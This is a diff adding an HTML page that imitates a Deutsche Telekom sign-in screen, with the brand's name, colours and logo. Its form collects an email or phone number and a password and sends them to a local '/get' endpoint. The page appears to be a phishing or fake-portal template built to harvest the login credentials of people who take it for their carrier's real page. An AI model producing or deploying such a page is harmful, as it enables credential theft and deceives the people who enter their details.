@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FFC72C;
+  margin-right: 100px
+}
+
+.dt-name {
+  font-size: 42px;
+  color: #999999;
+  margin-left: 10px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #E30075;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #E30075;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #E30075;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #FFC72C;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+  <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="100.000000pt" height="110.000000pt" viewBox="0 0 1200.000000 1428.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1428.000000) scale(0.100000,-0.100000)"
+fill="#E30075" stroke="none">
+<path d="M80 11795 l0 -2405 425 0 425 0 0 173 c1 821 196 1544 575 2132 184
+285 479 601 747 801 359 267 746 450 1203 567 324 84 589 117 978 124 l287 6
+0 -5279 c0 -5696 3 -5383 -50 -5626 -43 -201 -130 -410 -236 -569 -65 -98
+-223 -261 -321 -331 -153 -110 -336 -193 -533 -242 -221 -54 -271 -58 -777
+-63 l-473 -5 0 -499 0 -499 3670 0 3670 0 0 500 0 500 -402 0 c-436 0 -568 8
+-754 45 -504 101 -861 369 -1063 797 -98 207 -154 450 -171 745 -6 93 -10
+2280 -10 5341 l0 5182 219 0 c121 0 278 -5 348 -11 1410 -115 2464 -851 2951
+-2059 185 -460 281 -1004 282 -1597 l0 -133 420 0 420 0 0 2405 0 2405 -5915
+0 -5915 0 0 -2405z"/>
+<path d="M80 6285 l0 -1415 1410 0 1410 0 0 1415 0 1415 -1410 0 -1410 0 0
+-1415z"/>
+<path d="M9090 6285 l0 -1415 1410 0 1410 0 0 1415 0 1415 -1410 0 -1410 0 0
+-1415z"/>
+</g>
+</svg>
+
+
+
+    <div class="dt-name">Deutsche Telekom</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+
+
+      <button class="submit-btn" type="submit">Continue</button>
+
+
+    </form>
+
+  </div>
+
+</div>
+</body>
+</html>
